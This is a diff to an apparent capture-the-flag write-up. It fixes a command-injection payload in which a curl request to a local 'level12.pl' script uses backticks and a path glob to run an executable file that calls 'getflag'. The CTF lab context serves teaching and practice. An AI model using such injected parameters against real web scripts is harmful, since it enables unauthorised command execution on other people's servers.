@@ -24,5 +24,5 @@ so we can maybe put a command inside a file and send it:
 ```bash
 $ echo "getflag | wall" > TMP
 $ chmod +x TMP
-$ curl 'http://localhost:4646/level12.pl?x=`/*/TMP/`'
+$ curl 'http://localhost:4646/level12.pl?x=`/*/TMP`'
 ```
